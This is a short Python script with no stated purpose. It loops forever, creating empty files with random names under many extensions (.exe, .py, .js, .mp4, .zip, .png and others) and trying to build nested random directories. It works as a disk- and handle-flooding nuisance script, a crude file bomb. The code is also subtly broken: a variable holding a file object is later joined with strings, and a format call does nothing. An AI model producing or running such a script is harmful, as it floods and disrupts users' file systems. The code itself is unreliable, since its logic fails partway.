import os
import time
import string
from random import *

characters = string.ascii_letters + string.digits


while 1 ==1:
    
    
    f0 =  "".join(choice(characters) for x in range(randint(15, 15)))
    f1 =  "".join(choice(characters) for x in range(randint(20, 20)))
    f2 =  "".join(choice(characters) for x in range(randint(5, 20)))
    f3 =  "".join(choice(characters) for x in range(randint(5, 20)))
    f4 =  "".join(choice(characters) for x in range(randint(5, 20)))
    f  =  "".join(choice(characters) for x in range(randint(5, 15)))

    f= open(f0+".txt","w+")
    d = os.path.dirname(__file__) # directory of script
    p = r''+f0+'/'+f1+'/'+f2+'/'+f3+'/'+f4+'/'+f+'/oof'.format(d) # path to be created
    f= open(f0+".exe","w+")
    f= open(f0+".py","w+")
    f= open(f0+".js","w+")
    f= open(f0+".mp4","w+")
    f= open(f0+".mp3","w+")
    f= open(f0+".zip","w+")
    f= open(f0+".png","w+")
    f= open(f0+".jpg","w+")
    f= open(f0+".ico","w+")
    f= open(f0+".csv","w+")
    f= open(f1+".exe","w+")
    f= open(f1+".py","w+")
    f= open(f1+".js","w+")
    f= open(f1+".mp4","w+")
    f= open(f1+".mp3","w+")
    f= open(f1+".zip","w+")
    f= open(f1+".png","w+")
    f= open(f1+".jpg","w+")
    f= open(f1+".ico","w+")
    f= open(f1+".csv","w+")
    f= open(f2+".exe","w+")
    f= open(f2+".py","w+")
    f= open(f2+".js","w+")
    f= open(f2+".mp4","w+")
    f= open(f2+".mp3","w+")
    f= open(f2+".zip","w+")
    f= open(f2+".png","w+")
    f= open(f2+".jpg","w+")
    f= open(f2+".ico","w+")
    f= open(f2+".csv","w+")
    f= open(f3+".exe","w+")
    f= open(f3+".py","w+")
    f= open(f3+".js","w+")
    f= open(f3+".mp4","w+")
    f= open(f3+".mp3","w+")
    f= open(f3+".zip","w+")
    f= open(f3+".png","w+")
    f= open(f3+".jpg","w+")
    f= open(f3+".ico","w+")
    f= open(f3+".csv","w+")
    f= open(f4+".exe","w+")
    f= open(f4+".py","w+")
    f= open(f4+".js","w+")
    f= open(f4+".mp4","w+")
    f= open(f4+".mp3","w+")
    f= open(f4+".zip","w+")
    f= open(f4+".png","w+")
    f= open(f4+".jpg","w+")
    f= open(f4+".ico","w+")
    f= open(f4+".csv","w+")
    f= open(f+".exe","w+")
    f= open(f+".py","w+")
    f= open(f+".js","w+")
    f= open(f+".mp4","w+")
    f= open(f+".mp3","w+")
    f= open(f+".zip","w+")
    f= open(f+".png","w+")
    f= open(f+".jpg","w+")
    f= open(f+".ico","w+")
    f= open(f+".csv","w+")
    

    try:
        os.makedirs(p)
    except OSError:
        pass
